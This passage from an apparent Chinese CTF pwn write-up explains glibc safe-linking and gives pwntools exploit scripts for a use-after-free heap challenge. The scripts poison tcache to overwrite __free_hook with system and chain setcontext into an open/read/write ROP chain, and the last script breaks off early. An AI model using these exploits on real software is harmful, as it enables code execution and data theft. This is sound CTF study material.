<p>Tcahe和Fastbin的fd都被异或加密过，保存的fd = 真实fd^(当前堆地址&lt;&lt;12)</p>
</blockquote>
<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="co"># -*- coding: utf-8 -*-</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a>context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a>context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a>libc <span class="op">=</span> ELF(<span class="st">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a>elf <span class="op">=</span> ELF(<span class="st">&quot;./pwn&quot;</span>)</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true"></a></span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true"></a>local <span class="op">=</span> <span class="dv">1</span></span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true"></a></span>
<span id="cb1-10"><a href="#cb1-10" aria-hidden="true"></a><span class="cf">if</span> local:</span>
<span id="cb1-11"><a href="#cb1-11" aria-hidden="true"></a>    p <span class="op">=</span> process(<span class="st">&quot;./pwn&quot;</span>)    </span>
<span id="cb1-12"><a href="#cb1-12" aria-hidden="true"></a><span class="cf">else</span>:</span>
<span id="cb1-13"><a href="#cb1-13" aria-hidden="true"></a>    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</span>
<span id="cb1-14"><a href="#cb1-14" aria-hidden="true"></a></span>
<span id="cb1-15"><a href="#cb1-15" aria-hidden="true"></a><span class="kw">def</span> debug(p):</span>
<span id="cb1-16"><a href="#cb1-16" aria-hidden="true"></a>    <span class="cf">if</span> local:</span>
<span id="cb1-17"><a href="#cb1-17" aria-hidden="true"></a>        gdb.attach(p)</span>
<span id="cb1-18"><a href="#cb1-18" aria-hidden="true"></a>    <span class="cf">else</span>:</span>
<span id="cb1-19"><a href="#cb1-19" aria-hidden="true"></a>        <span class="cf">pass</span></span>
<span id="cb1-20"><a href="#cb1-20" aria-hidden="true"></a></span>
<span id="cb1-21"><a href="#cb1-21" aria-hidden="true"></a><span class="kw">def</span> cmd(i):</span>
<span id="cb1-22"><a href="#cb1-22" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;choice:&quot;</span>,<span class="bu">str</span>(i))</span>
<span id="cb1-23"><a href="#cb1-23" aria-hidden="true"></a></span>
<span id="cb1-24"><a href="#cb1-24" aria-hidden="true"></a><span class="kw">def</span> add(size,data):</span>
<span id="cb1-25"><a href="#cb1-25" aria-hidden="true"></a>    cmd(<span class="dv">1</span>)</span>
<span id="cb1-26"><a href="#cb1-26" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Size:&quot;</span>,<span class="bu">str</span>(size))</span>
<span id="cb1-27"><a href="#cb1-27" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</span>
<span id="cb1-28"><a href="#cb1-28" aria-hidden="true"></a></span>
<span id="cb1-29"><a href="#cb1-29" aria-hidden="true"></a><span class="kw">def</span> show(idx):</span>
<span id="cb1-30"><a href="#cb1-30" aria-hidden="true"></a>    cmd(<span class="dv">4</span>)</span>
<span id="cb1-31"><a href="#cb1-31" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb1-32"><a href="#cb1-32" aria-hidden="true"></a></span>
<span id="cb1-33"><a href="#cb1-33" aria-hidden="true"></a><span class="kw">def</span> delete(idx):</span>
<span id="cb1-34"><a href="#cb1-34" aria-hidden="true"></a>    cmd(<span class="dv">2</span>)</span>
<span id="cb1-35"><a href="#cb1-35" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb1-36"><a href="#cb1-36" aria-hidden="true"></a></span>
<span id="cb1-37"><a href="#cb1-37" aria-hidden="true"></a><span class="kw">def</span> edit(idx,data):</span>
<span id="cb1-38"><a href="#cb1-38" aria-hidden="true"></a>    cmd(<span class="dv">3</span>)</span>
<span id="cb1-39"><a href="#cb1-39" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb1-40"><a href="#cb1-40" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</span>
<span id="cb1-41"><a href="#cb1-41" aria-hidden="true"></a></span>
<span id="cb1-42"><a href="#cb1-42" aria-hidden="true"></a>add(<span class="bn">0x500</span>,<span class="st">&quot;0000&quot;</span>) <span class="co">#0</span></span>
<span id="cb1-43"><a href="#cb1-43" aria-hidden="true"></a>add(<span class="bn">0x70</span>,<span class="st">&quot;1111&quot;</span>) <span class="co">#1</span></span>
<span id="cb1-44"><a href="#cb1-44" aria-hidden="true"></a>add(<span class="bn">0x70</span>,<span class="st">&quot;2222&quot;</span>) <span class="co">#2</span></span>
<span id="cb1-45"><a href="#cb1-45" aria-hidden="true"></a>add(<span class="bn">0x70</span>,<span class="st">&quot;3333&quot;</span>) <span class="co">#3</span></span>
<span id="cb1-46"><a href="#cb1-46" aria-hidden="true"></a></span>
<span id="cb1-47"><a href="#cb1-47" aria-hidden="true"></a>delete(<span class="dv">0</span>)</span>
<span id="cb1-48"><a href="#cb1-48" aria-hidden="true"></a>show(<span class="dv">0</span>) <span class="co"># leak libc</span></span>
<span id="cb1-49"><a href="#cb1-49" aria-hidden="true"></a>p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
<span id="cb1-50"><a href="#cb1-50" aria-hidden="true"></a>libc.address <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span><span class="dv">96</span><span class="op">-</span>libc.sym[<span class="st">&#39;__malloc_hook&#39;</span>]<span class="op">-</span><span class="bn">0x10</span></span>
<span id="cb1-51"><a href="#cb1-51" aria-hidden="true"></a><span class="bu">print</span> <span class="bu">hex</span>(libc.address)</span>
<span id="cb1-52"><a href="#cb1-52" aria-hidden="true"></a>delete(<span class="dv">1</span>)</span>
<span id="cb1-53"><a href="#cb1-53" aria-hidden="true"></a>show(<span class="dv">1</span>) <span class="co"># leak heap &amp; key</span></span>
<span id="cb1-54"><a href="#cb1-54" aria-hidden="true"></a>p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
<span id="cb1-55"><a href="#cb1-55" aria-hidden="true"></a>heap_base <span class="op">=</span> (u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">&lt;&lt;</span><span class="dv">12</span>)<span class="op">-</span><span class="bn">0x1000</span></span>
<span id="cb1-56"><a href="#cb1-56" aria-hidden="true"></a><span class="bu">print</span> <span class="bu">hex</span>(heap_base)</span>
<span id="cb1-57"><a href="#cb1-57" aria-hidden="true"></a>delete(<span class="dv">2</span>)</span>
<span id="cb1-58"><a href="#cb1-58" aria-hidden="true"></a>key <span class="op">=</span> (heap_base<span class="op">+</span><span class="bn">0x1840</span>)<span class="op">&gt;&gt;</span><span class="dv">12</span></span>
<span id="cb1-59"><a href="#cb1-59" aria-hidden="true"></a>fd <span class="op">=</span> key<span class="op">^</span>libc.sym[<span class="st">&#39;__free_hook&#39;</span>]</span>
<span id="cb1-60"><a href="#cb1-60" aria-hidden="true"></a>edit(<span class="dv">2</span>,p64(fd)<span class="op">+</span>p64(<span class="dv">0</span>))</span>
<span id="cb1-61"><a href="#cb1-61" aria-hidden="true"></a>add(<span class="bn">0x70</span>,<span class="st">&quot;/bin/sh</span><span class="ch">\x00</span><span class="st">&quot;</span>) <span class="co">#4</span></span>
<span id="cb1-62"><a href="#cb1-62" aria-hidden="true"></a>add(<span class="bn">0x70</span>,p64(libc.sym[<span class="st">&#39;system&#39;</span>])) <span class="co">#5</span></span>
<span id="cb1-63"><a href="#cb1-63" aria-hidden="true"></a>delete(<span class="dv">4</span>)</span>
<span id="cb1-64"><a href="#cb1-64" aria-hidden="true"></a><span class="co"># debug(p)</span></span>
<span id="cb1-65"><a href="#cb1-65" aria-hidden="true"></a>p.interactive()</span></code></pre></div>
<h2 id="x01-无限制uaf-orw">0x01 无限制UAF-ORW</h2>
<p>对高版本ORW来说，主要是寻找好用的magic gadget，这里先放两个：</p>
<p>方法一：修改rdx到rdi来调用context+61</p>
<pre class="assembly"><code>mov rdx, qword ptr [rdi + 8] 
mov qword ptr [rsp], rax 
call qword ptr [rdx + 0x20]</code></pre>
<p>方法二：修改rax+28为leave；ret进制栈迁移</p>
<pre class="assembly"><code>mov rbp, qword ptr [rdi + 0x48]; 
mov rax, qword ptr [rbp + 0x18]; 
lea r13, [rbp + 0x10]; 
mov dword ptr [rbp + 0x10], 0; 
mov rdi, r13; 
call qword ptr [rax + 0x28];</code></pre>
<p>方法三：泄露栈地址__environ直接修改返回rop</p>
<h3 id="方法一修改rdx到rdi">方法一、修改rdx到rdi</h3>
<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="co"># -*- coding: utf-8 -*-</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true"></a>context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true"></a>context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true"></a>libc <span class="op">=</span> ELF(<span class="st">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)</span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true"></a>elf <span class="op">=</span> ELF(<span class="st">&quot;./pwn&quot;</span>)</span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true"></a></span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true"></a>local <span class="op">=</span> <span class="dv">1</span></span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true"></a></span>
<span id="cb4-10"><a href="#cb4-10" aria-hidden="true"></a><span class="cf">if</span> local:</span>
<span id="cb4-11"><a href="#cb4-11" aria-hidden="true"></a>    p <span class="op">=</span> process(<span class="st">&quot;./pwn&quot;</span>)    </span>
<span id="cb4-12"><a href="#cb4-12" aria-hidden="true"></a><span class="cf">else</span>:</span>
<span id="cb4-13"><a href="#cb4-13" aria-hidden="true"></a>    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</span>
<span id="cb4-14"><a href="#cb4-14" aria-hidden="true"></a></span>
<span id="cb4-15"><a href="#cb4-15" aria-hidden="true"></a><span class="kw">def</span> debug(p):</span>
<span id="cb4-16"><a href="#cb4-16" aria-hidden="true"></a>    <span class="cf">if</span> local:</span>
<span id="cb4-17"><a href="#cb4-17" aria-hidden="true"></a>        gdb.attach(p)</span>
<span id="cb4-18"><a href="#cb4-18" aria-hidden="true"></a>    <span class="cf">else</span>:</span>
<span id="cb4-19"><a href="#cb4-19" aria-hidden="true"></a>        <span class="cf">pass</span></span>
<span id="cb4-20"><a href="#cb4-20" aria-hidden="true"></a></span>
<span id="cb4-21"><a href="#cb4-21" aria-hidden="true"></a><span class="kw">def</span> cmd(i):</span>
<span id="cb4-22"><a href="#cb4-22" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;choice:&quot;</span>,<span class="bu">str</span>(i))</span>
<span id="cb4-23"><a href="#cb4-23" aria-hidden="true"></a></span>
<span id="cb4-24"><a href="#cb4-24" aria-hidden="true"></a><span class="kw">def</span> add(size,data):</span>
<span id="cb4-25"><a href="#cb4-25" aria-hidden="true"></a>    cmd(<span class="dv">1</span>)</span>
<span id="cb4-26"><a href="#cb4-26" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Size:&quot;</span>,<span class="bu">str</span>(size))</span>
<span id="cb4-27"><a href="#cb4-27" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</span>
<span id="cb4-28"><a href="#cb4-28" aria-hidden="true"></a></span>
<span id="cb4-29"><a href="#cb4-29" aria-hidden="true"></a><span class="kw">def</span> show(idx):</span>
<span id="cb4-30"><a href="#cb4-30" aria-hidden="true"></a>    cmd(<span class="dv">4</span>)</span>
<span id="cb4-31"><a href="#cb4-31" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb4-32"><a href="#cb4-32" aria-hidden="true"></a></span>
<span id="cb4-33"><a href="#cb4-33" aria-hidden="true"></a><span class="kw">def</span> delete(idx):</span>
<span id="cb4-34"><a href="#cb4-34" aria-hidden="true"></a>    cmd(<span class="dv">2</span>)</span>
<span id="cb4-35"><a href="#cb4-35" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb4-36"><a href="#cb4-36" aria-hidden="true"></a></span>
<span id="cb4-37"><a href="#cb4-37" aria-hidden="true"></a><span class="kw">def</span> edit(idx,data):</span>
<span id="cb4-38"><a href="#cb4-38" aria-hidden="true"></a>    cmd(<span class="dv">3</span>)</span>
<span id="cb4-39"><a href="#cb4-39" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb4-40"><a href="#cb4-40" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</span>
<span id="cb4-41"><a href="#cb4-41" aria-hidden="true"></a></span>
<span id="cb4-42"><a href="#cb4-42" aria-hidden="true"></a></span>
<span id="cb4-43"><a href="#cb4-43" aria-hidden="true"></a>add(<span class="bn">0x500</span>,<span class="st">&quot;0000&quot;</span>) <span class="co">#0</span></span>
<span id="cb4-44"><a href="#cb4-44" aria-hidden="true"></a>add(<span class="bn">0x70</span>,<span class="st">&quot;1111&quot;</span>) <span class="co">#1</span></span>
<span id="cb4-45"><a href="#cb4-45" aria-hidden="true"></a>add(<span class="bn">0x70</span>,<span class="st">&quot;2222&quot;</span>) <span class="co">#2</span></span>
<span id="cb4-46"><a href="#cb4-46" aria-hidden="true"></a>add(<span class="bn">0x70</span>,<span class="st">&quot;3333&quot;</span>) <span class="co">#3</span></span>
<span id="cb4-47"><a href="#cb4-47" aria-hidden="true"></a></span>
<span id="cb4-48"><a href="#cb4-48" aria-hidden="true"></a></span>
<span id="cb4-49"><a href="#cb4-49" aria-hidden="true"></a>delete(<span class="dv">0</span>)</span>
<span id="cb4-50"><a href="#cb4-50" aria-hidden="true"></a>show(<span class="dv">0</span>) <span class="co"># leak libc</span></span>
<span id="cb4-51"><a href="#cb4-51" aria-hidden="true"></a>p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
<span id="cb4-52"><a href="#cb4-52" aria-hidden="true"></a>libc.address <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span><span class="dv">96</span><span class="op">-</span>libc.sym[<span class="st">&#39;__malloc_hook&#39;</span>]<span class="op">-</span><span class="bn">0x10</span></span>
<span id="cb4-53"><a href="#cb4-53" aria-hidden="true"></a><span class="bu">print</span> <span class="bu">hex</span>(libc.address)</span>
<span id="cb4-54"><a href="#cb4-54" aria-hidden="true"></a>delete(<span class="dv">1</span>)</span>
<span id="cb4-55"><a href="#cb4-55" aria-hidden="true"></a>show(<span class="dv">1</span>) <span class="co"># leak heap &amp; key</span></span>
<span id="cb4-56"><a href="#cb4-56" aria-hidden="true"></a>p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
<span id="cb4-57"><a href="#cb4-57" aria-hidden="true"></a>heap_base <span class="op">=</span> (u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">&lt;&lt;</span><span class="dv">12</span>)<span class="op">-</span><span class="bn">0x1000</span></span>
<span id="cb4-58"><a href="#cb4-58" aria-hidden="true"></a><span class="bu">print</span> <span class="bu">hex</span>(heap_base)</span>
<span id="cb4-59"><a href="#cb4-59" aria-hidden="true"></a>delete(<span class="dv">2</span>)</span>
<span id="cb4-60"><a href="#cb4-60" aria-hidden="true"></a>key <span class="op">=</span> (heap_base<span class="op">+</span><span class="bn">0x1840</span>)<span class="op">&gt;&gt;</span><span class="dv">12</span></span>
<span id="cb4-61"><a href="#cb4-61" aria-hidden="true"></a>fd <span class="op">=</span> key<span class="op">^</span>libc.sym[<span class="st">&#39;__free_hook&#39;</span>]</span>
<span id="cb4-62"><a href="#cb4-62" aria-hidden="true"></a>edit(<span class="dv">2</span>,p64(fd)<span class="op">+</span>p64(<span class="dv">0</span>))</span>
<span id="cb4-63"><a href="#cb4-63" aria-hidden="true"></a></span>
<span id="cb4-64"><a href="#cb4-64" aria-hidden="true"></a>magic <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x14a0a0</span></span>
<span id="cb4-65"><a href="#cb4-65" aria-hidden="true"></a>setcontext <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x529ad</span></span>
<span id="cb4-66"><a href="#cb4-66" aria-hidden="true"></a>heap <span class="op">=</span> heap_base<span class="op">+</span><span class="bn">0x1940</span></span>
<span id="cb4-67"><a href="#cb4-67" aria-hidden="true"></a>rop_addr <span class="op">=</span> heap<span class="op">+</span><span class="bn">0xb0</span></span>
<span id="cb4-68"><a href="#cb4-68" aria-hidden="true"></a></span>
<span id="cb4-69"><a href="#cb4-69" aria-hidden="true"></a>pop_rdi <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x0000000000028a55</span></span>
<span id="cb4-70"><a href="#cb4-70" aria-hidden="true"></a>pop_rsi <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x000000000002a4cf</span></span>
<span id="cb4-71"><a href="#cb4-71" aria-hidden="true"></a>pop_rdx <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x00000000000c7f32</span></span>
<span id="cb4-72"><a href="#cb4-72" aria-hidden="true"></a>pop_rax <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x0000000000044c70</span></span>
<span id="cb4-73"><a href="#cb4-73" aria-hidden="true"></a>syscall <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x000000000006105a</span></span>
<span id="cb4-74"><a href="#cb4-74" aria-hidden="true"></a></span>
<span id="cb4-75"><a href="#cb4-75" aria-hidden="true"></a>rop <span class="op">=</span> p64(pop_rdi)</span>
<span id="cb4-76"><a href="#cb4-76" aria-hidden="true"></a>rop <span class="op">+=</span>p64(heap)</span>
<span id="cb4-77"><a href="#cb4-77" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rsi)</span>
<span id="cb4-78"><a href="#cb4-78" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="dv">0</span>)</span>
<span id="cb4-79"><a href="#cb4-79" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rdx)</span>
<span id="cb4-80"><a href="#cb4-80" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="dv">0</span>)</span>
<span id="cb4-81"><a href="#cb4-81" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rax)</span>
<span id="cb4-82"><a href="#cb4-82" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="dv">2</span>)</span>
<span id="cb4-83"><a href="#cb4-83" aria-hidden="true"></a>rop <span class="op">+=</span>p64(syscall)</span>
<span id="cb4-84"><a href="#cb4-84" aria-hidden="true"></a></span>
<span id="cb4-85"><a href="#cb4-85" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rdi)</span>
<span id="cb4-86"><a href="#cb4-86" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="dv">3</span>)</span>
<span id="cb4-87"><a href="#cb4-87" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rsi)</span>
<span id="cb4-88"><a href="#cb4-88" aria-hidden="true"></a>rop <span class="op">+=</span>p64(heap<span class="op">-</span><span class="bn">0x30</span>)</span>
<span id="cb4-89"><a href="#cb4-89" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rdx)</span>
<span id="cb4-90"><a href="#cb4-90" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="bn">0x30</span>)</span>
<span id="cb4-91"><a href="#cb4-91" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rax)</span>
<span id="cb4-92"><a href="#cb4-92" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="dv">0</span>)</span>
<span id="cb4-93"><a href="#cb4-93" aria-hidden="true"></a>rop <span class="op">+=</span>p64(syscall)</span>
<span id="cb4-94"><a href="#cb4-94" aria-hidden="true"></a></span>
<span id="cb4-95"><a href="#cb4-95" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rdi)</span>
<span id="cb4-96"><a href="#cb4-96" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="dv">1</span>)</span>
<span id="cb4-97"><a href="#cb4-97" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rax)</span>
<span id="cb4-98"><a href="#cb4-98" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="dv">1</span>)</span>
<span id="cb4-99"><a href="#cb4-99" aria-hidden="true"></a>rop <span class="op">+=</span>p64(syscall)</span>
<span id="cb4-100"><a href="#cb4-100" aria-hidden="true"></a></span>
<span id="cb4-101"><a href="#cb4-101" aria-hidden="true"></a>add(<span class="bn">0x600</span>,<span class="st">&quot;./flag</span><span class="ch">\x00\x00</span><span class="st">&quot;</span><span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">*</span><span class="dv">3</span><span class="op">+</span>p64(setcontext)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">*</span><span class="dv">15</span><span class="op">+</span>p64(rop_addr)<span class="op">+</span>rop) <span class="co">#4</span></span>
<span id="cb4-102"><a href="#cb4-102" aria-hidden="true"></a>add(<span class="bn">0x70</span>,p64(<span class="dv">0</span>)<span class="op">+</span>p64(heap)) <span class="co">#5</span></span>
<span id="cb4-103"><a href="#cb4-103" aria-hidden="true"></a><span class="bu">print</span> <span class="bu">hex</span>(setcontext)</span>
<span id="cb4-104"><a href="#cb4-104" aria-hidden="true"></a></span>
<span id="cb4-105"><a href="#cb4-105" aria-hidden="true"></a>debug(p)</span>
<span id="cb4-106"><a href="#cb4-106" aria-hidden="true"></a></span>
<span id="cb4-107"><a href="#cb4-107" aria-hidden="true"></a>add(<span class="bn">0x70</span>,p64(magic)) <span class="co">#6</span></span>
<span id="cb4-108"><a href="#cb4-108" aria-hidden="true"></a>delete(<span class="dv">5</span>)</span>
<span id="cb4-109"><a href="#cb4-109" aria-hidden="true"></a><span class="co"># debug(p)</span></span>
<span id="cb4-110"><a href="#cb4-110" aria-hidden="true"></a>p.interactive()</span>
<span id="cb4-111"><a href="#cb4-111" aria-hidden="true"></a></span>
<span id="cb4-112"><a href="#cb4-112" aria-hidden="true"></a><span class="co">&#39;&#39;&#39;</span></span>
<span id="cb4-113"><a href="#cb4-113" aria-hidden="true"></a><span class="co">0x000000000014a0a0 :mov rdx, qword ptr [rdi + 8] ;</span></span>
<span id="cb4-114"><a href="#cb4-114" aria-hidden="true"></a><span class="co">                    mov qword ptr [rsp], rax ; </span></span>
<span id="cb4-115"><a href="#cb4-115" aria-hidden="true"></a><span class="co">                    call qword ptr [rdx + 0x20]</span></span>
<span id="cb4-116"><a href="#cb4-116" aria-hidden="true"></a><span class="co">&#39;&#39;&#39;</span></span></code></pre></div>
<h3 id="方法二栈迁移">方法二、栈迁移</h3>
<p>由于栈迁移完之后只有0x10字节的空余可以填写rop，之后就会遇到之前填充的内容，所以可以给之前填充的内容都给pop到任意一个寄存器中去从而跳过垃圾字节。</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="co"># -*- coding: utf-8 -*-</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a>context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a>context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true"></a>libc <span class="op">=</span> ELF(<span class="st">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)</span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true"></a>elf <span class="op">=</span> ELF(<span class="st">&quot;./pwn&quot;</span>)</span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true"></a></span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true"></a>local <span class="op">=</span> <span class="dv">1</span></span>
<span id="cb5-9"><a href="#cb5-9" aria-hidden="true"></a></span>
<span id="cb5-10"><a href="#cb5-10" aria-hidden="true"></a><span class="cf">if</span> local:</span>
<span id="cb5-11"><a href="#cb5-11" aria-hidden="true"></a>    p <span class="op">=</span> process(<span class="st">&quot;./pwn&quot;</span>)    </span>
<span id="cb5-12"><a href="#cb5-12" aria-hidden="true"></a><span class="cf">else</span>:</span>
<span id="cb5-13"><a href="#cb5-13" aria-hidden="true"></a>    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</span>
<span id="cb5-14"><a href="#cb5-14" aria-hidden="true"></a></span>
<span id="cb5-15"><a href="#cb5-15" aria-hidden="true"></a><span class="kw">def</span> debug(p):</span>
<span id="cb5-16"><a href="#cb5-16" aria-hidden="true"></a>    <span class="cf">if</span> local:</span>
<span id="cb5-17"><a href="#cb5-17" aria-hidden="true"></a>        gdb.attach(p)</span>
<span id="cb5-18"><a href="#cb5-18" aria-hidden="true"></a>    <span class="cf">else</span>:</span>
<span id="cb5-19"><a href="#cb5-19" aria-hidden="true"></a>        <span class="cf">pass</span></span>
<span id="cb5-20"><a href="#cb5-20" aria-hidden="true"></a></span>
<span id="cb5-21"><a href="#cb5-21" aria-hidden="true"></a><span class="kw">def</span> cmd(i):</span>
<span id="cb5-22"><a href="#cb5-22" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;choice:&quot;</span>,<span class="bu">str</span>(i))</span>
<span id="cb5-23"><a href="#cb5-23" aria-hidden="true"></a></span>
<span id="cb5-24"><a href="#cb5-24" aria-hidden="true"></a><span class="kw">def</span> add(size,data):</span>
<span id="cb5-25"><a href="#cb5-25" aria-hidden="true"></a>    cmd(<span class="dv">1</span>)</span>
<span id="cb5-26"><a href="#cb5-26" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Size:&quot;</span>,<span class="bu">str</span>(size))</span>
<span id="cb5-27"><a href="#cb5-27" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</span>
<span id="cb5-28"><a href="#cb5-28" aria-hidden="true"></a></span>
<span id="cb5-29"><a href="#cb5-29" aria-hidden="true"></a><span class="kw">def</span> show(idx):</span>
<span id="cb5-30"><a href="#cb5-30" aria-hidden="true"></a>    cmd(<span class="dv">4</span>)</span>
<span id="cb5-31"><a href="#cb5-31" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb5-32"><a href="#cb5-32" aria-hidden="true"></a></span>
<span id="cb5-33"><a href="#cb5-33" aria-hidden="true"></a><span class="kw">def</span> delete(idx):</span>
<span id="cb5-34"><a href="#cb5-34" aria-hidden="true"></a>    cmd(<span class="dv">2</span>)</span>
<span id="cb5-35"><a href="#cb5-35" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb5-36"><a href="#cb5-36" aria-hidden="true"></a></span>
<span id="cb5-37"><a href="#cb5-37" aria-hidden="true"></a><span class="kw">def</span> edit(idx,data):</span>
<span id="cb5-38"><a href="#cb5-38" aria-hidden="true"></a>    cmd(<span class="dv">3</span>)</span>
<span id="cb5-39"><a href="#cb5-39" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb5-40"><a href="#cb5-40" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</span>
<span id="cb5-41"><a href="#cb5-41" aria-hidden="true"></a></span>
